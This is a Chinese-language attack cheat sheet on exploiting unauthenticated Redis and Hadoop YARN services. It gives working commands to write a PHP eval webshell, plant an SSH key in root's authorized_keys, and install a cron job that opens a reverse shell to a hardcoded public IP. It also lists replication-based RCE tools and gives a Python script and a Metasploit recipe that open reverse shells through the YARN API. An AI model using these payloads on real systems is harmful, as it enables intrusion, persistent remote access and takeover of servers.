# 未授权访问漏洞

## redis

### redis简介

- 键值数据库

- 架构

  redis服务器：存储数据，处理客户端请求，执行数据结构操作

  redis客户端：与服务器交互命令行工具，执行redis命令

- 默认端口：6379

- 常用命令

  Linux安装：

  ```bash
  apt install redis-tools
  ```

  连接：

  ```bash
  redis-cli -h [hostname] -p [port] -a [password]
  ```

  redis命令

  ```bash
  # 基本数据操作
  set key 'aaa'    #设置键key的值为字符串aaa
  get key    #获取键key的值
  set int 12    #设置键int的值为12
  incr int    #int增加1
  keys *    #列出当前数据库中所有键
  
  # 配置
  config set dir /home/test    #设置工作目录
  config set dbfilename filename    #设置备份文件名(可以为任意后缀名)
  config get dir    #获取工作目录
  config get dbfilename    # 获取备份文件名
  
  #数据库管理
  save    #备份数据到磁盘
  flushall    #删除所有数据
  del key    #删除键为key的数据
  ```

  

### 漏洞利用

#### 未授权访问漏洞

##### 写webshell

- 条件

  知道根目录绝对路径

  有写权限

- 写webshell

  ```bash
  redis-cli -h [hostname] -p [port]
  config set dir /var/www/html
  config set dbfilename shell.php
  set x "<?php @eval($_POST['cmd']);?>"
  save
  ```

  shell成功写入后就可以访问或者用工具连接

##### 写SSH公钥

1. 攻击端生成SSH公钥和私钥

   ```bash
   ssh-keygen -q -t rsa -f /root/.ssh/id_rsa -N ''
   ```

2. 在id_rsa.pub公钥前后加上换行符，保存

   ```bash
   (echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > ./foo.txt
   ```

3. 读取foo.txt中的内容，存入redis

   ```bash
   cat ./foo.txt | redis-cli -h [hostname] -p [port] -x set x
   redis-cli -h [hostname] -p [port] 
   get x
   config set dir /root/.ssh
   config set dbfilename "authorized_keys"
   save
   
   # ssh连接
   ssh root@hostname -p [port] -i ~/.ssh/id_rsa
   ```

   

##### 定时任务反弹shell

- 定时任务位置

  |     系统      |          定时任务位置           |             例子              |
  | :-----------: | :-----------------------------: | :---------------------------: |
  | debian ubuntu | /var/spool/cron/crontabs/用户名 | /var/spool/cron/crontabs/root |
  | centos redhat |     /var/spool/cron/用户名      |     /var/spool/cron/root      |

- 写入定时任务

  ```bash
  redis-cli -h [hostname] p [port]
  config dir /var/spool/cron
  config dbfilename root
  set aaa "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/124.70.99.192/1111 0>&1\n\n"
  save
  ```

- nc 监听端口 

  ```bash
  nc -lvvp 1111
  ```

#### 主从复制RCE

##### RabR

- github搜索RabR可以找到

  ```bash
  python3 redis-attack.py -r target-url -p port -L 攻击机ip --brute
  # 选择对应的选项getshell或者反弹shell
  ```

  

##### redis-rce

1. 下载redis-rce脚本

   github搜索redis-rce

2. 编译module.so文件

   ```bash
   git clone https://gitee.com/yijingsec/RedisModules-ExecuteCommand
   cd RedisModules-ExecuteCommand
   make
   ```

   

3. 将编译好的module.so文件复制到redis-rce文件夹中

4. 脚本利用

   ```bash
   python3 redis-rce.py -r target-url/ip -p port -L attack-ip -f module.so
   # 选择对应序号从而选择getshell或者反弹shell
   ```


## Hadoop

### 漏洞探测

- fofa

  app="APACHE-hadoop-YARN"

- POST请求

  向http://ip:port/ws/v1/cluster/apps/new-application发送POST请求，响应返回application-id，存在漏洞

### 漏洞利用

#### 利用脚本

```python
import requests
import json

# 漏洞目标 URL
target = 'http://192.168.81.127:8088/'
# 反弹Shell 攻击机IP地址
lhost = '192.168.81.238'

url = f'{target}ws/v1/cluster/apps/new-application'
resp = requests.post(url).content.decode('utf-8')
resp_json = json.loads(resp)

app_id = resp_json['application-id']
url = f'{target}ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {'command': f'/bin/bash -i >& /dev/tcp/{lhost}/5566 0>&1'}
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
```

#### 利用模块

```bash
msfconsole -q
use exploit/linux/http/hadoop_unauth_exec
set rhost target-ip
set payload linux/x64/meterpreter/reverse_tcp
set lhost attack-ip
set lport attack-port
exploit
```

